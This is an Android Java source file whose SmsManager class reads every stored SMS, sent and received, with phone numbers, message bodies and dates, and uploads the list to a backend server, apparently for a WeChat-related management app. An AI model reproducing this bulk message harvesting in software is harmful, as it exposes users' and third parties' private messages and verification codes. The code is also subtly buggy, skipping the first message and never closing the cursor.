package com.gentcent.wechat.zzk.smscall;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import com.alibaba.fastjson.JSONObject;
import com.blankj.utilcode.util.ToastUtils;
import com.gentcent.wechat.zzk.background.UploadUtil;
import com.gentcent.wechat.zzk.smscall.bean.SmsInfo;
import com.gentcent.wechat.zzk.util.GsonUtils;
import com.gentcent.wechat.zzk.util.XLog;
import com.zhy.http.okhttp.callback.StringCallback;

import java.util.ArrayList;
import java.util.List;

import okhttp3.Call;

/**
 * @author zuozhi
 * @since 2019-09-10
 */
public class SmsManager {
	// 用来存放唯一id，筛选重复的短信信息
	public static List<SmsInfo> list = new ArrayList<>();
	private static Uri SMS_INBOX = Uri.parse("content://sms/");
	
	/**
	 * 判断是否已经上传过了
	 *
	 * @param smsInfo smsInfo
	 * @return boolean
	 */
	public static boolean isContains(SmsInfo smsInfo) {
		return list.contains(smsInfo);
	}
	
	/**
	 * 标记该条信息已添加
	 *
	 * @param smsInfo smsInfo
	 */
	public static void add(SmsInfo smsInfo) {
		list.add(smsInfo);
	}
	
	public static void syncSms(ContentResolver cr, StringCallback stringCallback) {
		list.clear();
		String[] projection = new String[]{"_id", "thread_id", "address", "body", "date", "type", "read"};
		Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
		if (null == cur || !cur.moveToNext()) {
			return;
		}
		while (cur.moveToNext()) {
			String id = cur.getString(cur.getColumnIndex("_id"));//短信id
			String number = cur.getString(cur.getColumnIndex("address"));//手机号
			String body = cur.getString(cur.getColumnIndex("body"));//短信内容
			int type = cur.getInt(cur.getColumnIndex("type"));//类型 1:接受 2:发送
			long date = cur.getLong(cur.getColumnIndex("date"));//发生时间
			SmsInfo smsInfo = new SmsInfo(id, number, body, type, date);
			if (isContains(smsInfo)) return;
			add(smsInfo);
		}
//		for (SmsInfo smsInfo : list) {
//			XLog.d(smsInfo.toString());
//		}
		UploadUtil.sendToBack(list, stringCallback);
		
	}
	
}
